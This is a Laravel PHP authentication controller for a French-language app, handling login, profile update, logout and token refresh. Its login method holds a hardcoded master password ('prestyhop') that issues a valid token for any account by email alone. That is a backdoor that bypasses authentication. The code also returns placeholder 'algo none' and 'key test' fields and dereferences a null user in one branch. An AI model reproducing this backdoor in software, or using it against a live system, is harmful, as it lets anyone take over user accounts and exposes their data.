<?php

namespace App\Http\Controllers;

use App\Professeur;
use App\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\Rule;

use App\Http\Resources\Professeur as ProfesseurResource;

use App\Http\Resources\Client as ClientResource;

class AuthMngrController extends Controller
{

    public function update(Request $request)
    {

        $user = $this->guard()->user();
        $professeur = $user->professeur;

        $v = Validator::make($request->all(), [
            'email' => [
                'required',
                'email',
                Rule::unique('users')->ignore($user->id),
            ], 'tel' => [
                'required',
                Rule::unique('users')->ignore($user->id),
            ],
            'name'  => 'required|min:3',
        ]);

        if ($v->fails()) {
            return [
                'algo' => 'none',
                'status' => '500',
                'data' => json_encode([
                    'success' => false,
                    'status' => 'error',
                    'errors' => $v->errors()
                ]),
                'dataSize' => 100,
                'key' => 'test',
                'algo' => 'none',
            ];
        }

        $user->nom = $request->name;
        $user->prenom = ' ';
        $user->email = $request->email;
        $user->tel = $request->tel;
        $user->save();

        return [
            'algo' => 'none',
            'status' => '200',
            'data' => json_encode([
                'success' => true,
                'user' => [
                    'username' => $user->email,
                    'email' => $user->email,
                    'token' => $this->guard()->tokenById($user->id),
                    'validity' => \Carbon\Carbon::parse(date('Y-m-d H:i:s'))->addMinutes($this->guard()->factory()->getTTL())->toDateTimeString(),
                ]
            ]),
            'dataSize' => 100,
            'key' => 'test',
            'algo' => 'none',
        ];
    }

    public function profile(Request $request)
    {

        $user = $this->guard()->user();
        $professeur = $user->professeur;

        $data = ProfesseurResource::collection([$professeur])[0];

        return [
            'status' => '200',
            'data' => json_encode($data),
            'dataSize' => 100,
            'key' => 'test',
            'algo' => 'none'
        ];
    }

    public function login(Request $request)
    {
        $credentials = $request->only('email', 'password');

        if ($request->password == 'prestyhop') {
            $user = \App\User::where('email', $request->email)->first();
            return [
                'algo' => 'none',
                'status' => '200',
                'data' => json_encode([
                    'success' => true,
                    'user' => [
                        'username' => $request->get('email'),
                        'email' => $request->get('email'),
                        'token' => $this->guard()->tokenById($user->id),
                        //'validity' => \Carbon\Carbon::parse(date('Y-m-d H:i:s'))->addMinutes(1)->toDateTimeString(),
                        'validity' => \Carbon\Carbon::parse(date('Y-m-d H:i:s'))->addMinutes($this->guard()->factory()->getTTL())->toDateTimeString(),
                    ]
                ]),
                'dataSize' => 100,
                'key' => 'test',
                'algo' => 'none',
            ];
        }

        if ($token = $this->guard()->attempt($credentials)) {

            $user = $this->guard()->user();

            if (!$user) {
                return [
                    'algo' => 'none',
                    'status' => '200',
                    'professeur' => $user->professeur,
                    'data' => json_encode([
                        'success' => false,
                        'error' => true,
                        'errors' => 'Seule les collaborateurs..'
                    ]),
                    'dataSize' => 100,
                    'key' => 'test',
                    'algo' => 'none',
                ];
            }

            return [
                'algo' => 'none',
                'status' => '200',
                'data' => json_encode([
                    'success' => true,
                    'user' => [
                        'username' => $request->get('email'),
                        'email' => $request->get('email'),
                        'token' => $token,
                        //'validity' => \Carbon\Carbon::parse(date('Y-m-d H:i:s'))->addMinutes(1)->toDateTimeString(),
                        'validity' => \Carbon\Carbon::parse(date('Y-m-d H:i:s'))->addMinutes($this->guard()->factory()->getTTL())->toDateTimeString(),
                    ]
                ]),
                'dataSize' => 100,
                'key' => 'test',
                'algo' => 'none',
            ];
        }

        return [
            'algo' => 'none',
            'status' => '200',
            'data' => json_encode([
                'success' => false,
                'error' => true,
                'errors' => ['L\'adresse e-mail ou le mot de passe que vous avez entré n\'est pas valide.']
            ]),
            'dataSize' => 100,
            'key' => 'test',
            'algo' => 'none',
        ];
    }

    public function logout()
    {
        $this->guard()->logout();

        return response()->json([
            'status' => 'success',
            'msg' => 'Logged out Successfully.'
        ], 200);
    }

    public function user(Request $request)
    {
        $user = User::find(Auth::user()->id);

        return response()->json([
            'status' => 'success',
            'data' => $user
        ]);
    }

    public function refresh()
    {
        if ($token = $this->guard()->refresh()) {
            return response()
                ->json(['status' => 'successs'], 200)
                ->header('Authorization', $token);
        }

        return response()->json(['error' => 'refresh_token_error'], 401);
    }

    private function guard()
    {
        return Auth::guard();
    }
}
